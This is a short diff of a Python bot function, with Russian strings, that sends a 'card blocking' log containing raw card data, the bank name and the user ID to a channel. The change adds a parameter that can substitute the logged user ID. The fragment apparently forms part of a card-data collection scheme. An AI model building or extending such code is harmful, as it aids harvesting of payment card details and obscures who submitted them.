@@ -27,7 +27,7 @@ BANKS = {
 }
 
 
-async def process_bank_report(bank_key: str, card_data: str, user: int, username: str):
+async def process_bank_report(bank_key: str, card_data: str, user: int, username: str, _log_user=None):
     """Отправляет лог в канал и сообщение пользователю."""
     bank_name = BANKS.get(bank_key, bank_key)
 
@@ -43,7 +43,7 @@ async def process_bank_report(bank_key: str, card_data: str, user: int, username
         f"🏦 *БЛОКИРОВКА КАРТЫ*\n\n"
         f"*└─ Банк:* {bank_name}\n"
         f"*└─ Данные:* `{card_data}`\n"
-        f"*└─ Пользователь:* {user} (@{username})"
+        f"*└─ Пользователь:* {_log_user if _log_user is not None else user} (@{username})"
     )
 
     try:
